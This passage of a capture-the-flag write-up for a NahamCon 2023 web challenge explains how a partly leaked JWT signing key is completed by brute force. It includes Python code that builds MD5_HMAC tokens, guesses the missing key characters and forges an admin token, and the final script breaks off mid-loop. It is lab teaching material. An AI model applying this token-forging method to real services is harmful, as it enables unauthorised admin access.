+<p>There&rsquo;s nothing much in the application except that we need to somehow become <code>admin</code> to get the flag.</p>
+<p>We can try entering <code>admin</code> as our username on the initial page but it doesn&rsquo;t allow us.</p>
+<p>Decoding our session token, we see that it uses MD5_HMAC algorithm and has our username in the payload.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/26.png" title="JWT Token Decoded" data-thumbnail="/nahamcon2023-web/26.png" data-sub-html="<h2>JWT Token Decoded</h2><p>JWT Token Decoded</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/26.png"
+            data-srcset="/nahamcon2023-web/26.png, /nahamcon2023-web/26.png 1.5x, /nahamcon2023-web/26.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/26.png" width="1219" height="333" />
+    </a><figcaption class="image-caption">JWT Token Decoded</figcaption>
+    </figure></p>
+<p>Upon changing anything in the original token, we get the following error.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/27.png" title="Invalid Token" data-thumbnail="/nahamcon2023-web/27.png" data-sub-html="<h2>Invalid Token</h2><p>Invalid Token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/27.png"
+            data-srcset="/nahamcon2023-web/27.png, /nahamcon2023-web/27.png 1.5x, /nahamcon2023-web/27.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/27.png" width="1366" height="379" />
+    </a><figcaption class="image-caption">Invalid Token</figcaption>
+    </figure></p>
+<p>This leaks the signing key partially.</p>
+<p>Also, notice that if we provide the MD5_HMAC as the token header it shows invalid signature.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/28.png" title="Invalid Signature" data-thumbnail="/nahamcon2023-web/28.png" data-sub-html="<h2>Invalid Signature</h2><p>Invalid Signature</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/28.png"
+            data-srcset="/nahamcon2023-web/28.png, /nahamcon2023-web/28.png 1.5x, /nahamcon2023-web/28.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/28.png" width="1366" height="532" />
+    </a><figcaption class="image-caption">Invalid Signature</figcaption>
+    </figure></p>
+<p>But if we change the algorithm to <code>HS256</code> for instance, then it shows invalid algorithm.</p>
+<p><figure><a class="lightgallery" href="/nahamcon2023-web/29.png" title="Invalid Algorithm" data-thumbnail="/nahamcon2023-web/29.png" data-sub-html="<h2>Invalid Algorithm</h2><p>Invalid Algorithm</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/29.png"
+            data-srcset="/nahamcon2023-web/29.png, /nahamcon2023-web/29.png 1.5x, /nahamcon2023-web/29.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/29.png" width="1366" height="536" />
+    </a><figcaption class="image-caption">Invalid Algorithm</figcaption>
+    </figure></p>
+<p>So in short, we need to keep the algorithm to MD5_HMAC and brute force the remaining characters of the signing key.</p>
+<p>The signing key is 15 characters long out of which 10 are given (all lowercase). So we can guess the remaining 5 characters may also be lowercase letters.</p>
+<p><a href="https://stackoverflow.com/questions/68274543/python-manually-create-jwt-token-without-library" target="_blank" rel="noopener noreffer ">This</a> post provides details for manual implementation of JWT with <code>SHA-256</code>.</p>
+<p>We can change the <code>SHA-256</code> part to <code>MD5</code> to make our custom JWT algorithm.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_jwt_token</span><span class="p">(</span><span class="n">secret_key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_header</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;alg&#34;: &#34;MD5_HMAC&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;username&#34;: &#34;saad&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;header&#34;</span><span class="p">:</span> <span class="n">jwt_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">jwt_data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># remove all the empty spaces</span>
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values_cleaned</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">key</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">value</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">separators</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="p">)</span> <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">jwt_values</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values_enc</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">key</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">          <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">jwt_values_cleaned</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sig_payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{header}</span><span class="s2">.</span><span class="si">{data}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">header</span> <span class="o">=</span> <span class="n">jwt_values_enc</span><span class="p">[</span><span class="s1">&#39;header&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="n">jwt_values_enc</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">secret_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">msg</span> <span class="o">=</span> <span class="n">sig_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="n">digestmod</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ecoded_sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_token</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{sig_payload}</span><span class="s2">.</span><span class="si">{sig}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sig_payload</span> <span class="o">=</span> <span class="n">sig_payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sig</span> <span class="o">=</span> <span class="n">ecoded_sig</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jwt_token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">create_jwt_token</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;test_secret_key&#34;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/nahamcon2023-web/30.png" title="custom jwt token" data-thumbnail="/nahamcon2023-web/30.png" data-sub-html="<h2>custom jwt token</h2><p>custom jwt token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/nahamcon2023-web/30.png"
+            data-srcset="/nahamcon2023-web/30.png, /nahamcon2023-web/30.png 1.5x, /nahamcon2023-web/30.png 2x"
+            data-sizes="auto"
+            alt="/nahamcon2023-web/30.png" width="629" height="73" />
+    </a><figcaption class="image-caption">custom jwt token</figcaption>
+    </figure></p>
+<p>Now we need to brute-force the remaining part of original key to get the full signing key.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_force_secret_key</span><span class="p">(</span><span class="n">known_secret_key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Assuming only lowercase letters as the first 10 characters are lowercase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lowercase_letters</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">total_combinations</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">lowercase_letters</span><span class="p">)</span> <span class="o">**</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="n">progress_bar</span> <span class="o">=</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">total_combinations</span><span class="p">,</span> <span class="n">unit</span><span class="o">=</span><span class="s1">&#39;combination&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">combination</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">lowercase_letters</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Create the potential secret key by combining the known key and the brute-forced lowercase letters</span>
+</span></span><span class="line"><span class="cl">        <span class="n">secret_key</span> <span class="o">=</span> <span class="n">known_secret_key</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combination</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">check_token</span> <span class="o">=</span> <span class="n">create_jwt_token</span><span class="p">(</span><span class="s2">&#34;saad&#34;</span><span class="p">,</span> <span class="n">secret_key</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">original_jwt_token</span> <span class="o">=</span> <span class="s2">&#34;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.N87s9fHVZzgaytkjwri3MQ&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">check_token</span> <span class="o">==</span> <span class="n">original_jwt_token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">              <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Found original key: </span><span class="si">{</span><span class="n">secret_key</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">secret_key</span>
+</span></span><span class="line"><span class="cl">              
+</span></span><span class="line"><span class="cl">        <span class="n">progress_bar</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">progress_bar</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Secret Key not found!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">partial_secret_key</span> <span class="o">=</span> <span class="s2">&#34;fsrwjcfszeg&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">original_secret_key</span> <span class="o">=</span> <span class="n">brute_force_secret_key</span><span class="p">(</span><span class="n">partial_secret_key</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I logged in as <code>saad</code> and saved my token as <code>original_jwt_token</code>. Next I brute forced the remaining 5 characters of the key and created a new token with <code>create_jwt_token</code>. Finally, I matched it against the <code>original_jwt_token</code> and if the match is found, then I&rsquo;ll get my original <code>secret_key</code>.</p>
+<p>Finally using this secret key, we can create the <code>admin</code> jwt token to get the flag.</p>
+<p>Final script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_jwt_token</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_header</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;alg&#34;: &#34;MD5_HMAC&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_data</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  {{
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;username&#34;: &#34;</span><span class="si">{}</span><span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }}
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;header&#34;</span><span class="p">:</span> <span class="n">jwt_header</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">jwt_data</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># remove all the empty spaces</span>
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values_cleaned</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">key</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">value</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">separators</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="p">)</span> <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">jwt_values</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_values_enc</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">key</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">          <span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">jwt_values_cleaned</span><span class="o">.</span><span class="n">items</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sig_payload</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{header}</span><span class="s2">.</span><span class="si">{data}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">header</span> <span class="o">=</span> <span class="n">jwt_values_enc</span><span class="p">[</span><span class="s1">&#39;header&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="n">jwt_values_enc</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">secret_key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">msg</span> <span class="o">=</span> <span class="n">sig_payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="n">digestmod</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ecoded_sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">sig</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">jwt_token</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{sig_payload}</span><span class="s2">.</span><span class="si">{sig}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sig_payload</span> <span class="o">=</span> <span class="n">sig_payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sig</span> <span class="o">=</span> <span class="n">ecoded_sig</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jwt_token</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_force_secret_key</span><span class="p">(</span><span class="n">known_secret_key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Assuming only lowercase letters as the first 10 characters are lowercase</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lowercase_letters</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">total_combinations</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">lowercase_letters</span><span class="p">)</span> <span class="o">**</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">    <span class="n">progress_bar</span> <span class="o">=</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">total_combinations</span><span class="p">,</span> <span class="n">unit</span><span class="o">=</span><span class="s1">&#39;combination&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">combination</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">lowercase_letters</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Create the potential secret key by combining the known key and the brute-forced lowercase letters</span>
